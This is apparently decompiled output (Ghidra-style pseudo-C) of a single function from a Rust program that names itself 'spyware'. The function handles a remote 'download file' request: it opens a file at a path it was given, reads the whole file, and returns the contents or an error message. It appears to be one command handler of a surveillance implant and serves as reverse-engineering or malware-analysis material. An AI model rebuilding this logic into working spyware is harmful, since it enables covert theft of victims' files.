undefined8 *
_ZN7spyware7actions10basic_info21download_file_message17h8a802bf593e1dd2fE
          (undefined8 *param_1,undefined8 param_2)

{
  char cVar1;
  uint uVar2;
  ulong uVar3;
  long lVar4;
  undefined auVar5 [16];
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 uStack_b8;
  char *local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 *local_88;
  undefined8 local_80;
  undefined8 local_78;
  byte local_68 [4];
  undefined4 local_64;
  undefined8 local_60;
  undefined8 local_58;
  code *local_50;
  undefined *local_48;
  code *local_40;
  undefined local_38 [24];
  
  uVar3 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (3 < uVar3) {
    local_50 = 
    _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h9e2c9c436a613463E;
    local_98 = &DAT_001b9810;
    uStack_90 = 2;
    local_78 = 0;
    local_88 = &local_58;
    local_80 = 1;
    local_58 = param_2;
                    /* try { // try from 00154ed4 to 00154f29 has its CatchHandler @ 0015514c */
    local_a0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_s_src_actions_basic_info_rs_001b9860);
    local_c0 = 
    "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \""
    ;
    uStack_b8 = 0x1c;
    local_b0 = 
    "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \""
    ;
    local_a8 = 0x1c;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_98,4,&local_c0);
  }
  _ZN3std2fs4File4open17h9ff4b407758639b8E(local_68,param_2);
  if ((local_68[0] & 1) == 0) {
    local_c0 = (char *)CONCAT44(local_c0._4_4_,local_64);
    local_98 = (undefined *)0x0;
    uStack_90 = 1;
    local_88 = (undefined8 *)0x0;
                    /* try { // try from 001550a9 to 001550c3 has its CatchHandler @ 00155134 */
    auVar5 = (*(code *)
               PTR__ZN47__LT_std__fs__File_u20_as_u20_std__io__Read_GT_11read_to_end17hc5ce334212601c81E_001be7e8
             )(&local_c0,&local_98);
    _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hb253015956d15545E(auVar5._0_8_,auVar5._8_8_);
    param_1[2] = local_88;
    *param_1 = local_98;
    param_1[1] = uStack_90;
    param_1[3] = 0x8000000000000000;
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb5daeec03bf79b51E((int)local_c0);
  }
  else {
    local_c8 = local_60;
    lVar4 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (lVar4 != 0) {
                    /* try { // try from 00154f4c to 00154f5e has its CatchHandler @ 00155115 */
      _ZN49__LT_T_u20_as_u20_alloc__string__SpecToString_GT_14spec_to_string17h89fbb585ce883e17E
                (local_38,&local_c8);
      local_50 = 
      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h9e2c9c436a613463E;
      local_40 = 
      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h9e2c9c436a613463E;
      local_98 = &DAT_001b9830;
      uStack_90 = 3;
      local_78 = 0;
      local_88 = &local_58;
      local_80 = 2;
      local_58 = param_2;
      local_48 = local_38;
                    /* try { // try from 00154fb1 to 00154ff9 has its CatchHandler @ 0015511a */
      local_a0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                           (&PTR_s_src_actions_basic_info_rs_001b9890);
      local_c0 = 
      "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \""
      ;
      uStack_b8 = 0x1c;
      local_b0 = 
      "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \""
      ;
      local_a8 = 0x1c;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_98,1,&local_c0);
                    /* try { // try from 00154ffa to 00155006 has its CatchHandler @ 00155115 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h46afe0b9deda2fc5E(local_38);
      local_60 = local_c8;
    }
    local_c0 = (char *)0x0;
    uStack_b8 = 1;
    local_b0 = (char *)0x0;
    _ZN3std2io5error14repr_bitpacked11decode_repr17h049ae64b4e643a43E(&local_98,local_60);
    cVar1 = (char)local_98;
    uVar2 = local_98._4_4_;
                    /* try { // try from 0015503d to 00155049 has its CatchHandler @ 00155106 */
    _ZN49__LT_T_u20_as_u20_alloc__string__SpecToString_GT_14spec_to_string17h89fbb585ce883e17E
              (&local_98,&local_c8);
    param_1[5] = local_88;
    param_1[3] = local_98;
    param_1[4] = uStack_90;
    param_1[2] = local_b0;
    *(int *)param_1 = (int)local_c0;
    *(undefined4 *)((long)param_1 + 4) = local_c0._4_4_;
    *(undefined4 *)(param_1 + 1) = (undefined4)uStack_b8;
    *(undefined4 *)((long)param_1 + 0xc) = uStack_b8._4_4_;
    *(uint *)(param_1 + 6) = -(uint)(cVar1 != '\0') | uVar2;
                    /* try { // try from 0015507c to 00155083 has its CatchHandler @ 0015514c */
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_c8);
  }
  _ZN4core3ptr74drop_in_place_LT_spyware__communication__messages__DownloadFileRequest_GT_17h11893678bd4df8adE
            (param_2);
  return param_1;
}